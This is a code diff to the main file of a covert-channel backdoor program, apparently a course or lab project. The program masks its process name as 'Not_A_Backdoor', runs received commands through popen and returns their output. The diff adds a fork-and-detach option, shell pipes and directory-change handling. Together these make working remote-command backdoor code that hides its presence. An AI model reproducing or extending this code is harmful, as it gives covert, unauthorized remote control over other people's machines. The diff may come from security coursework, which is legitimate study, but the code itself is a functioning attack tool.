@@ -4,9 +4,11 @@
 #include <signal.h>
 #include <csignal>
 #include <pcap.h>
+#include <zconf.h>
 #include "NetworkMonitor.h"
 #include "CovertSocket.h"
 #include "../utils/Logger.h"
+#include "../utils/argparcer.h"
 
 #define newProcessName "Not_A_Backdoor"
 
@@ -16,6 +18,12 @@ pcap_if_t * listeningInterface = nullptr;
 bool keepListening = true;
 
 NetworkMonitor * monitor = nullptr;
+
+//we need to fork to open shell
+int input[2];
+int output[2];
+
+bool shellCreated = false;
 
 void shutdownServer(int signo){
     cout << "Terminating Program" << endl;
@@ -69,7 +77,8 @@ string executeCommand(string command){
     Logger::debug("Setting Up Variables To Execute Command");
 
     //append redirects to the command
-    command = command + " 2>&1";
+    //command = command + " 2>&1";
+    //command = command + "\n";
     string response = ""; // storage for response
     const int BUFFERSIZE = 2048;
     char BUFFER[BUFFERSIZE];
@@ -78,6 +87,12 @@ string executeCommand(string command){
 
     Logger::debug("Command At This Point Is: >" + command + "<");
 
+    size_t position = command.find("cd");
+    if(position != string::npos){
+        chdir(command.substr(position+3).c_str());
+        response += "[DIRECTORY CHANGED TO]: ";
+        command = "pwd";
+    }
 
     if((fp = popen(command.c_str(), "r")) == NULL){
         Logger::error("Main:executeCommand - There Was An Error Executing The Command");
@@ -119,8 +134,25 @@ string executeCommand(string command){
 
 int main(int argc, char * argv[]) {
 
-    Logger::setDebug(true);
 
+    ArgParcer parcer;
+
+    if(parcer.TagExists("--LEAVE", argv, argc)){
+
+        pid_t pid = fork();
+        if(pid < 0){
+            cout << "There Was An Error Forking. Aborting" << endl;
+            return 1;
+        }
+
+        if(pid > 0){
+            cout << "This Is The Parent. Terminating" << endl;
+            return 0;
+        }
+
+    }
+
+    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
     Logger::debug("Starting Program");
 
     //mask the program
